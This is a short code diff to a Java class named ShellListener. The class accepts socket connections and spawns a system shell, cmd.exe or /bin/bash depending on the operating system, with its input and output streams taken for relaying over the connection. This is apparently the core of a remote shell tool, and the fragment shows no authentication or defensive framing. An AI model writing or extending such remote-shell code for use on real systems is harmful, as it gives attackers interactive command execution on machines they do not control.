@@ -20,7 +20,16 @@ public class ShellListener {
                     System.out.println("Connection received from " + socket.getInetAddress());
                     isConnected = true;  // connection established
 
-                    Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
+                    String os = System.getProperty("os.name").toLowerCase();
+                    ProcessBuilder pb;
+                    if (os.contains("win")) {
+                        pb = new ProcessBuilder("cmd.exe");
+                    } else {
+                        pb = new ProcessBuilder("/bin/bash");
+                    }
+
+                    pb.redirectErrorStream(true);
+                    Process process = pb.start();
 
                     InputStream processInput = process.getInputStream();
                     OutputStream processOutput = process.getOutputStream();
